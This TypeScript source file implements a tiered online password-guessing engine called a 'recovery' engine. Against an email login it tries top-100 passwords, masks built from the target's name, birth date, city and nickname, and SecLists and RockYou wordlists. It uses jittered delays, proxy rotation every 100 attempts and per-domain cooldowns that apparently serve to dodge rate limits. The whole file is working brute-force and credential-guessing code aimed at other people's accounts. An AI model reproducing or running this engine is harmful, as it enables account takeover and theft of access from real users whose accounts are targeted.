import IORedis from "ioredis";
import { TOP_100, TOP_1000 } from "../dictionary/wordlists.js";
import {
  loadWordlist,
  isDownloaded,
} from "../dictionary/wordlist-manager.js";
import { generatePasswordPatterns, type PatternInput } from "../dictionary/pattern-generator.js";
import { AuthAttemptController } from "./attempt-controller.js";
import { config } from "../../config.js";

export interface TieredUserData {
  firstName: string;
  lastName: string;
  birthDate?: string;
  city?: string;
  nickname?: string;
}

export interface TierStats {
  tier: number;
  name: string;
  passwordCount: number;
  attempts: number;
  found: boolean;
  foundPassword?: string;
  timeMs: number;
}

export interface TieredResult {
  email: string;
  found: boolean;
  password: string | null;
  foundInTier: number | null;
  tierName: string | null;
  totalAttempts: number;
  totalTimeMs: number;
  tiers: TierStats[];
}

export type AuthFunction = (email: string, password: string) => Promise<boolean>;

export class TieredRecoveryEngine {
  private controller: AuthAttemptController;
  private globalTried = new Set<string>();
  private redis: IORedis | null = null;
  private useRedisCache: boolean;

  constructor(
    controllerConfig?: {
      delayMs?: number;
      jitterFactor?: number;
      maxAttemptsPerEmail?: number;
    },
    useRedisCache = false,
  ) {
    this.controller = new AuthAttemptController({
      enabled: true,
      delayMs: controllerConfig?.delayMs ?? 50,
      jitterFactor: controllerConfig?.jitterFactor ?? 0.2,
      maxAttemptsPerEmail: controllerConfig?.maxAttemptsPerEmail ?? 10000,
      proxyRotateEvery: 100,
      domainCooldownMs: 5000,
    });
    this.useRedisCache = useRedisCache;
  }

  async recover(
    email: string,
    userData: TieredUserData,
    authFn: AuthFunction,
    options?: { maxTier?: number; extraDictionary?: string[] },
  ): Promise<TieredResult> {
    const startTime = Date.now();
    const tiers: TierStats[] = [];
    this.globalTried.clear();

    if (this.useRedisCache) {
      try {
        this.redis = new IORedis(config.redis.url, { connectTimeout: 3000, maxRetriesPerRequest: 1 });
        const cached = await this.redis.smembers(`tiered-tried:${email}`);
        for (const p of cached) this.globalTried.add(p);
      } catch {
        this.redis = null;
      }
    }

    const maxTier = options?.maxTier ?? 6;

    // Tier 1: Hardcoded Top 100 (instant)
    if (maxTier >= 1) {
      const tier1 = await this.runTier(1, "Top 100 (Hardcoded)", TOP_100, email, authFn);
      tiers.push(tier1);
      if (tier1.found) return this.buildResult(email, tier1.foundPassword!, 1, tiers, startTime);
    }

    // Tier 2: Personalized masks
    if (maxTier >= 2) {
      const patterns = generatePasswordPatterns({
        firstName: userData.firstName,
        lastName: userData.lastName,
        birthDate: userData.birthDate,
        city: userData.city,
        nickname: userData.nickname,
      });
      const tier2 = await this.runTier(2, "Personalized Masks", patterns.passwords, email, authFn);
      tiers.push(tier2);
      if (tier2.found) return this.buildResult(email, tier2.foundPassword!, 2, tiers, startTime);
    }

    // Tier 3: SecLists 10K most common
    if (maxTier >= 3) {
      const seclist10k = (await isDownloaded("10k-most-common"))
        ? await loadWordlist("10k-most-common")
        : TOP_1000;
      const tier3name = seclist10k.length > 1000 ? "SecLists 10K" : "Top 1000 (Fallback)";
      const tier3 = await this.runTier(3, tier3name, seclist10k, email, authFn);
      tiers.push(tier3);
      if (tier3.found) return this.buildResult(email, tier3.foundPassword!, 3, tiers, startTime);
    }

    // Tier 4: SecLists 100K (NCSC)
    if (maxTier >= 4) {
      const seclist100k = (await isDownloaded("100k-NCSC"))
        ? await loadWordlist("100k-NCSC")
        : [];
      if (seclist100k.length > 0) {
        const tier4 = await this.runTier(4, "SecLists 100K (NCSC)", seclist100k, email, authFn);
        tiers.push(tier4);
        if (tier4.found) return this.buildResult(email, tier4.foundPassword!, 4, tiers, startTime);
      }
    }

    // Tier 5: RockYou 75K
    if (maxTier >= 5) {
      const rockyou = (await isDownloaded("rockyou-75"))
        ? await loadWordlist("rockyou-75")
        : [];
      if (rockyou.length > 0) {
        const tier5 = await this.runTier(5, "RockYou 75K", rockyou, email, authFn);
        tiers.push(tier5);
        if (tier5.found) return this.buildResult(email, tier5.foundPassword!, 5, tiers, startTime);
      }
    }

    // Tier 6: Custom dictionary (user-provided)
    if (maxTier >= 6 && options?.extraDictionary) {
      const tier6 = await this.runTier(6, "Custom Dictionary", options.extraDictionary, email, authFn);
      tiers.push(tier6);
      if (tier6.found) return this.buildResult(email, tier6.foundPassword!, 6, tiers, startTime);
    }

    // Cleanup
    if (this.redis) this.redis.disconnect();

    return {
      email,
      found: false,
      password: null,
      foundInTier: null,
      tierName: null,
      totalAttempts: tiers.reduce((s, t) => s + t.attempts, 0),
      totalTimeMs: Date.now() - startTime,
      tiers,
    };
  }

  private async runTier(
    tierNum: number,
    tierName: string,
    passwords: string[],
    email: string,
    authFn: AuthFunction,
  ): Promise<TierStats> {
    const start = Date.now();
    let attempts = 0;

    // Filter already tried (cross-tier dedup)
    const toTry = passwords.filter((p) => !this.globalTried.has(p));

    for (const password of toTry) {
      const check = await this.controller.beforeAttempt(email);
      if (!check.allowed) break;

      attempts++;
      this.globalTried.add(password);

      // Cache in Redis
      if (this.redis) {
        await this.redis.sadd(`tiered-tried:${email}`, password).catch(() => {});
      }

      this.controller.afterAttempt(email, false);

      const success = await authFn(email, password);

      if (success) {
        return {
          tier: tierNum,
          name: tierName,
          passwordCount: passwords.length,
          attempts,
          found: true,
          foundPassword: password,
          timeMs: Date.now() - start,
        };
      }
    }

    return {
      tier: tierNum,
      name: tierName,
      passwordCount: passwords.length,
      attempts,
      found: false,
      timeMs: Date.now() - start,
    };
  }

  private buildResult(
    email: string,
    password: string,
    tier: number,
    tiers: TierStats[],
    startTime: number,
  ): TieredResult {
    if (this.redis) this.redis.disconnect();

    return {
      email,
      found: true,
      password,
      foundInTier: tier,
      tierName: tiers[tiers.length - 1].name,
      totalAttempts: tiers.reduce((s, t) => s + t.attempts, 0),
      totalTimeMs: Date.now() - startTime,
      tiers,
    };
  }
}
